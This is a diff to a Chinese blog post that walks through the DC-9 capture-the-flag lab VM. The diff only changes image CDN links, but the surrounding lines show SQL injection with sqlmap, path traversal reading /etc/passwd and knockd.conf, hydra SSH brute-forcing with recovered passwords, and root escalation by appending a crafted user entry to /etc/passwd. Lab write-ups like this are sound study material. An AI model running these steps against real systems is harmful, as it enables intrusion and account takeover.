@@ -33,7 +33,7 @@ date: 2026-03-18 12:00:00
 nmap -sn 192.168.168.0/24
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image1.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image1.png)
 
 目标 IP：`192.168.168.169`
 
@@ -43,7 +43,7 @@ nmap -sn 192.168.168.0/24
 nmap -A -p- 192.168.168.169
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image2.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image2.png)
 
 扫到 SSH，但是被防火墙拦截：
 
@@ -65,15 +65,15 @@ nmap -A -p- 192.168.168.169
 
 依旧改hosts
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image3.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image3.png)
 
 有个搜索功能，用 Burp Suite 抓包：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image4.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image4.png)
 
 POST 抓包：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image5.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image5.png)
 
 标记注入点，保存为 sql.txt，用 sqlmap 跑：
 
@@ -81,17 +81,17 @@ POST 抓包：
 python sqlmap.py -r D:\Backup\桌面\sql.txt --dbs
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image6.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image6.png)
 
 跑出来了，有两个库：
 
 这个后续的ssh爆破有用
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image7.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image7.png)
 
 找到admin的密码
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image8.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image8.png)
 
 ### 2.2 破解哈希
 
@@ -102,19 +102,19 @@ https://hashes.com/zh/decrypt/hash
 856f5de590ef37314e7c3bdf6f8a66dc → transorbital1
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image9.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image9.png)
 
 ### 2.3 登录后台
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image10.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image10.png)
 
 后台有个添加记录功能：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image11.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image11.png)
 
 显示所有记录，可以看到刚刚输入的信息：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image12.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image12.png)
 
 不过好像没啥用，还是拿不到 Web 权限，换个思路继续找。
 
@@ -124,7 +124,7 @@ https://hashes.com/zh/decrypt/hash
 
 ### 3.1 发现文件包含
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image13.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image13.png)
 
 看到一个「文件不存在」的提示，感觉有文件包含，随便试了一下：
 
@@ -132,7 +132,7 @@ https://hashes.com/zh/decrypt/hash
 http://wordy/manage.php?file=../../../../../../etc/passwd
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image14.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image14.png)
 
 成功读取到 `/etc/passwd`！
 
@@ -148,7 +148,7 @@ http://wordy/manage.php?file=../../../../../../etc/passwd
 http://192.168.168.169/manage.php?file=../../../../../../../etc/knockd.conf
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image15.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image15.png)
 
 > **💡 这就是 LFI 的价值所在：** 不仅能读 `/etc/passwd`，还能读各种敏感配置文件，比如这里的 knockd.conf，直接暴露了敲门序列。
 
@@ -190,9 +190,9 @@ nc -z 192.168.168.169 9842
 
 用第一种方法后就正常了：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image16.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image16.png)
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image17.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image17.png)
 
 ---
 
@@ -204,7 +204,7 @@ nc -z 192.168.168.169 9842
 
 关于数据库里的数据怎么快速提取出来，可以写脚本，或者直接让 AI 帮你提：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image19.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image19.png)
 
 ### 5.2 第一轮爆破
 
@@ -212,11 +212,11 @@ nc -z 192.168.168.169 9842
 hydra -L u.txt -P p.txt 192.168.168.169 ssh
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image18.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image18.png)
 
 结果出现了三个：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image20.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image20.png)
 
 ```
 login: chandlerb   password: UrAG0D!
@@ -228,7 +228,7 @@ login: janitor     password: Ilovepeepee
 
 都翻一下，在 janitor 的 `.secrets-for-putin` 目录里发现了新密码：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image21.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image21.png)
 
 ```bash
 cat > p.txt << EOF
@@ -247,7 +247,7 @@ EOF
 hydra -L u.txt -P p.txt 192.168.168.169 ssh
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image22.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image22.png)
 
 又爆出了新用户，SSH 登录 fredf：
 
@@ -255,7 +255,7 @@ hydra -L u.txt -P p.txt 192.168.168.169 ssh
 ssh fredf@192.168.168.169
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image23.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image23.png)
 
 发现一个 sudo 特权！
 
@@ -267,7 +267,7 @@ ssh fredf@192.168.168.169
 
 本来想直接 cat 看看啥东西的，结果蹦我一脸乱码，应该是个二进制文件：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image24.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image24.png)
 
 用 strings 提取可读字符串大概看看：
 
@@ -275,11 +275,11 @@ ssh fredf@192.168.168.169
 strings /opt/devstuff/dist/test/test
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image25.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image25.png)
 
 不过还是太多了，直接执行看看：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image26.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image26.png)
 
 是 Python 打包后的二进制，找一下源代码：
 
@@ -288,13 +288,13 @@ find / -name "test.py" 2>/dev/null
 cat /opt/devstuff/test.py
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image27.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image27.png)
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image28.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image28.png)
 
 ### 6.2 分析源码
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image29.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image29.png)
 
 > **📝 分析含义：** 需要三个参数，如果不是 3 则输出 "Usage: ..."，满足 3 个参数，则把第 2 个参数的文件内容**追加写入**到第 3 个参数的文件中。
 >
@@ -318,7 +318,7 @@ sudo ./test /tmp/hack.txt /etc/passwd
 su hack
 ```
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image30.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image30.png)
 
 失败了，还是得加密码才行。
 
@@ -347,7 +347,7 @@ openssl passwd -1 123456
 
 密码格式是 `$1$盐值$哈希值`，每次盐值不同所以哈希不一样，但都是 123456 的哈希：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image31.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image31.png)
 
 ```bash
 echo 'hack:$1$3MSvX.EZ$ow32gSnIJJZWUeUkZ0cX50:0:0:hack:/root:/bin/bash' > /tmp/hack.txt
@@ -391,7 +391,7 @@ su - hackerx
 
 最终拿到 root，取得 flag：
 
-![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-9_image32.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-9_image32.png)
 
 ---
 
